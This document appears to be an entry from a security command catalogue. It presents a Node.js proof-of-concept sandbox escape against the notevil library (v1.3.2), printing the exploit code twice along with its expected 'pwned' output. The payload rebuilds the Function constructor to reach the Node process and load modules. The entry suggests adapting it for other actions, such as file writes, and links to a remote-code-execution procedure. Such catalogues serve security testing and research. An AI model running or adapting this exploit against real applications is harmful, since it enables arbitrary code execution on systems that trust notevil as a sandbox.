---
id: cmd-notevil-poc-node
data: >-
  var safeEval = require("notevil")

  var code = "" + "function fn() {};" + "var constructorProperty =
  Object.getOwnPropertyDescriptors(fn.__proto__.constructor);" + "var properties
  = Object.values(constructorProperty);" + "properties.pop();" +
  "properties.pop();" + "properties.pop();" + "var Func =
  properties.map(function (x) {return x.bind(x, 'return
  this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" +
  "(Func())()"

  console.log(safeEval(code))
tags:
  - rce
  - sandbox-escape
type: command
output: pwned (logged to console via util.log)
executor: node
platforms:
  - Node.js
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:08.438Z'
verified: false
validated: true
submitted: true
---
# notevil-sandbox-escape-poc-nodejs

## Command

```javascript
var safeEval = require("notevil")
var code = "" + "function fn() {};" + "var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);" + "var properties = Object.values(constructorProperty);" + "properties.pop();" + "properties.pop();" + "properties.pop();" + "var Func = properties.map(function (x) {return x.bind(x, 'return this.process.mainModule.constructor._load(`util`).log(`pwned`)')}).pop();" + "(Func())()"
console.log(safeEval(code))
```

## Description

Node.js script demonstrating sandbox escape in notevil v1.3.2 by executing a payload that reconstructs the Function constructor to load and use the util module for logging.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| code | Malicious JS payload string | Yes |

## Examples

### Basic Usage

```javascript
node poc.js
```

### Advanced Usage

Adapt payload for different code execution, e.g., replace log with file write.

## Expected Output

pwned (logged to console via util.log)

## Related

- [[procedures/Execute-Payload-to-Achieve-RCE-in-Node.js]]
